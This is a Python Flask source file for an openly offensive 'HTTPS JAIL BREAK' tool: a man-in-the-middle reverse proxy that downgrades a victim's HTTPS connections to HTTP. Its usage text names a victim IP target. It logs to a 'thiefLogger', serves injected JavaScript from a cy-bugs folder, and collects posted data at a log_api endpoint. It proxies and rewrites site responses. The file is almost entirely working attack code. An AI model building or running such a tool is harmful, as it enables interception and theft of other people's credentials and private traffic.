#⛓️  HTTPS JAIL BREAK ⛓️⛓️  HTTPS JAIL BREAK ⛓️⛓️  HTTPS JAIL BREAK ⛓️⛓️  HTTPS JAIL BREAK ⛓️⛓️  HTTPS JAIL BREAK ⛓️⛓️  HTTPS JAIL BREAK ⛓️
# written by Idan.M 
# reverse proxy for downgrading the connection from https to http



from flask import Flask, request,make_response
import requests
import proxy_utils 
import logging
import os 
import proxy_parser 
app = Flask(__name__)
PORT = 80
HOST="0.0.0.0"
logger = logging.Logger("thiefLogger")
logger.addHandler(logging.FileHandler("thief.log"))
logger.setLevel(logging.WARN)
@app.route("/",methods = ["GET"])
def wellcome(): 
     if request.host.removeprefix("http://").startswith("vvvvvv"): 
        return proxy("/")
     return f"""
          <body  style="background-color:blue;">
               <h1   style="color:lightgreen;font-size:75px;text-align: center;" >
                    ⛓️⛓️⛓️ HTTPS JAIL BREAK ⛓️⛓️⛓️
                    </br>
                    </br>
                    <span style="color:red;">
                        usage:</br> <span style="font-size:40px;">python3 hstsjailbreak.py <target> [-h,--help] [-s,--silent] [-i=,--iface=] </span></br>
                    ⛓️  🦊 HSTS JAIL BREAK 🦊 ⛓️</br>
        mandatory arguments: </br>
            🧔🏽‍♂️ target - the victim's ip address</br>
	optional arguments:      </br>
	    💁 -h,--help show this help message and exit </br>
	    🤫 -s,--silent silent or loud mode </br>
	    📬 -i,--iface IFACE Interface you wish to use </br>
                    </span>  
               </h1>
          </body>
          """
          
@app.route("/cybugs/<path:path>" , methods = ['GET'])
def cybugsServe(path):
     script = "Error" 
     response = None
     if "/" in path or ".." in path  : 
          return "You cant do LFI g - repoterd to the admin..." , 404
     try : 
          with open(f"../cy-bugs/{path}" , 'r') as file:
               script= "".join(filter(lambda x : not x.startswith("//") and x.strip("\n") ,file.readlines()))
          response = make_response(script)
          response.headers['content-type'] = "text/javascript"
          response.status_code = 200 
     except : 
          print("couldnt find cy-bug ... ")
          response = make_response(script)
          response.status_code = 404 
     return response
    
@app.route("/log_api/<path:path>" , methods = ['POST'])  
def log(path):  
     print(path)
     print("cool: ",request.json)
     print("cool2 : ",request.data)
     print("cool3 :",request.values)
     print(request.form.get("logData"))
     return "",200
                         
@app.route("/",methods = ["POST"])
@app.route("/<path:path>", methods=['GET', 'POST'])
def proxy(path):
     domainName =proxy_utils.cleanHostName(request.host) #get the requested host to reverse proxy 
     method = request.method #get the method 
     data = request.form.to_dict()   #get the data section for requests 
     parmas = proxy_parser.argsParse(request.args.to_dict(),domainName,path)
     respone = requests.request(method, domainName+path, data = data  ,params= parmas ,  headers= proxy_utils.cleanHeaders(request.headers,proxy_utils.Way.To))
     print(domainName+path , respone.status_code , respone)
     returnData = None
     if "content-type" in respone.headers and "image" in respone.headers["content-type"]: #return an Image 
          # proxy_utils.saveContent(respone.content,path,os.getcwd(),"image")
          resp =make_response(respone.content)
          resp.headers.set('Content-Type',respone.headers["content-type"] )
          resp.headers.set('Content-Disposition', 'attachment', filename=path)
          return resp  
     else : 
          returnData = proxy_parser.parse(respone.text,domainName=domainName , path=path,pageType="text/plain" if "content-type" not in respone.headers else  respone.headers["content-type"])
     code = respone.status_code
     headers = proxy_utils.cleanHeaders(respone.headers,proxy_utils.Way.From)
     return returnData , code , headers 
  
     
if __name__ == '__main__':
    app.run(host=HOST,port=PORT)